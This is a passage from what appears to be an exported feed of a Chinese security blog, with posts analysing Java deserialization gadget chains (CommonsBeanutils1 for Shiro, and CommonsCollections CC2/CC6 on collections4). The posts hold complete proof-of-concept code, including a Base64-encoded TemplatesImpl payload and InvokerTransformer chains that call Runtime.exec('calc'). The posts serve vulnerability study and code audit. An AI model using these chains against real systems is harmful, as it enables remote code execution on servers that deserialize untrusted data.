src="https://gitee.com/lcdm123/image/raw/master/image-20211118001128482.png" alt="image-20211118001128482"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Shiro-550-反序列化链（二）&quot;&gt;&lt;a href=&quot;#Shiro-550-反序列化链（二）&quot; class=&quot;headerlink&quot; title=&quot;Shiro-550 反序列化链（二）&quot;&gt;&lt;/a&gt;Shiro-550 反序列化链（二）&lt;/h2&gt;&lt;p&gt;在实际情况下</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CommonsBeanutils1</title>
    <link href="http://example.com/2021/11/17/Java-CommonsBeanutils1/"/>
    <id>http://example.com/2021/11/17/Java-CommonsBeanutils1/</id>
    <published>2021-11-17T14:23:38.000Z</published>
    <updated>2021-11-17T14:24:12.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsBeanutils与无commons-collections的shiro反序列化利用"><a href="#CommonsBeanutils与无commons-collections的shiro反序列化利用" class="headerlink" title="CommonsBeanutils与无commons-collections的shiro反序列化利用"></a>CommonsBeanutils与无commons-collections的shiro反序列化利用</h1><h2 id="JavaBean类"><a href="#JavaBean类" class="headerlink" title="JavaBean类"></a>JavaBean类</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p><p>JavaBean是特殊的java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> is;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setIs</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> is)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.is = is;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isIs</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> is;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个公有属性，并存在读取和设置着两个属性的方法（bool 类型的方法不一样）又称为 getter 和 setter。其中getter 的方法名以get开头，setter的方法名以set开头</p><p>commons-beanutils 中提供了一个静态方法<code>PropertyUtils.getProperty</code> 可以调用任意 JavaBean 的 getter 方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">new</span> People()</span>, <span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里<code>commons-beanutils</code>会自动找到People类的<code>getName()</code>，它还支持递归调用属性。比如a对象中有属性b，b对象 中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter-的使用"><a href="#getter-的使用" class="headerlink" title="getter 的使用"></a>getter 的使用</h2><p>在<code>org.apache.commons.beanutils.BeanComparator</code>中有一个<code>compare()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117141851422.png" alt="image-20211117141851422"></p><p>这里发现调用了<code>getProperty()</code>这里就看看能不能调用到某个方法的getter方法</p><p>在之前提到了 TemplatesImpl 类加载字节码时分析到过一个<code>getOutputProperties()</code>方法</p><p><a href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</a></p><p>而 getOutputProperties 这个名字，是以 get 开头，正符合getter的定义。所以在<code>PropertyUtils.getProperty( o1, property )</code> 这段代码中，当o1是一个<code>TemplatesImpl</code>对现象，并且<code>property</code>的值为<code>outputProperties</code>时，将会自动调用getter也就是<code>TemplatesImpl#getOutputProperties()</code>方法触发了代码执行。</p><h2 id="反序列化链构造"><a href="#反序列化链构造" class="headerlink" title="反序列化链构造"></a>反序列化链构造</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CBTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvUnVuRXhlYzsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4v&quot;</span> +<br>                <span class="hljs-string">&quot;aW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1s&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcA&quot;</span> +<br>                <span class="hljs-string">&quot;KgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29y&quot;</span> +<br>                <span class="hljs-string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYB&quot;</span> +<br>                <span class="hljs-string">&quot;AAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +<br>                <span class="hljs-string">&quot;SXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nl&quot;</span> +<br>                <span class="hljs-string">&quot;cmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcAKwEABjxpbml0PgEAAygpVgEAClNv&quot;</span> +<br>                <span class="hljs-string">&quot;dXJjZUZpbGUBAAxSdW5FeGVjLmphdmEBABNvcmcvbGNkbTEyMy9SdW5FeGVjDAAfACAHACwMAC0A&quot;</span> +<br>                <span class="hljs-string">&quot;LgEABGNhbGMMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9y&quot;</span> +<br>                <span class="hljs-string">&quot;dW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9s&quot;</span> +<br>                <span class="hljs-string">&quot;YW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEA&quot;</span> +<br>                <span class="hljs-string">&quot;JyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgA&quot;</span> +<br>                <span class="hljs-string">&quot;CQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAADgAMAAAAIAADAAAAAQANAA4AAAAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;DwAQAAEAAAABABEAEgACABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;BgABAAAAEgAMAAAAKgAEAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwAT&quot;</span> +<br>                <span class="hljs-string">&quot;AAAABAABABQACQAaABsAAgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFQAI&quot;</span> +<br>                <span class="hljs-string">&quot;ABYADAAAAAwAAQAAAAkAHAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4&quot;</span> +<br>                <span class="hljs-string">&quot;AAQSBbYABlexAAAAAgALAAAADgADAAAAFwAEABgADQAZAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl template =<span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(template,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(template,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        BeanComparator comp = <span class="hljs-keyword">new</span> BeanComparator();<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comp);<br>        <span class="hljs-comment">/*queue.add(template);</span><br><span class="hljs-comment">        queue.add(template);*/</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(comp,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]&#123;template, template&#125;);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117182424431.png" alt="image-20211117182424431"></p><h2 id="链子的问题"><a href="#链子的问题" class="headerlink" title="链子的问题"></a>链子的问题</h2><p>为啥直接使用<code>queue.add(template)</code>添加不能执行命令？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117215608791.png" alt="image-20211117215608791"></p><p>经过调试发现，如果直接使用<code>add(template)</code>代码执行到这里就会中断</p><p>对于<code>queue</code>变量，它使用的是transient反序列化没有影响？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117211534512.png" alt="image-20211117211534512"></p><p>反序列化时发现已经恢复了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117220932223.png" alt="image-20211117220932223"></p><p>应该是在readObject()方法中恢复</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117221844437.png" alt="image-20211117221844437"></p><p>执行完之后就赋值了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CommonsBeanutils与无commons-collections的shiro反序列化利用&quot;&gt;&lt;a href=&quot;#CommonsBeanutils与无commons-collections的shiro反序列化利用&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC2</title>
    <link href="http://example.com/2021/11/17/Java-CC2/"/>
    <id>http://example.com/2021/11/17/Java-CC2/</id>
    <published>2021-11-17T13:30:56.000Z</published>
    <updated>2021-11-17T13:31:33.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-CC2"><a href="#Java-CC2" class="headerlink" title="Java CC2"></a>Java CC2</h1><p>Apache Commons Collections 是一个著名的辅助开发库，里面包含了一些java中没有的数据结构和辅助方法。2015年底commons-collections反序列化利用链被提出时，Apache Commons Collections有以下两 个分⽀版本：</p><ul><li>commons-collections:commons-collections </li><li>org.apache.commons:commons-collections4</li></ul><p>对于3.2.1版本中的反序列化链，再4中会有吗？</p><p>这里利用CC6的链再4中测试根据这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">compare</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transform = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.lazyMap(inerMap,chainedTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transform);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj,value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116133112622.png" alt="image-20211116133112622"></p><p>上的POC中主要的变化地点就是<code>LazyMap</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116165719174.png" alt="image-20211116165719174"></p><h2 id="PriorityQueue链"><a href="#PriorityQueue链" class="headerlink" title="PriorityQueue链"></a>PriorityQueue链</h2><p>CommonsCollections2 链子中利用到的两个关键类是</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><p>在<code>java.util.PriorityQueue</code>中的<code>readObject()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117004436710.png" alt="image-20211117004436710"></p><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 在这个类中我们发现了在<code>compare()</code>中调用了<code>transform()</code>函数，所以这里就构想能否通过<code>java.util.PriorityQueue</code>中的<code>readObject()</code>的调用到此函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005426579.png" alt="image-20211117005426579"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005038847.png" alt="image-20211117005038847"></p><p>从<code>java.util.PriorityQueue</code>中的<code>readObject()</code>中的<code>heapify()</code>跟下去</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005741759.png" alt="image-20211117005741759"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005823062.png" alt="image-20211117005823062"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117005914843.png" alt="image-20211117005914843"></p><p>在这里发现在<code>siftDownUsingComparator()</code>里面调用了<code>compare()</code>函数</p><p>POC 编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br><br>        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        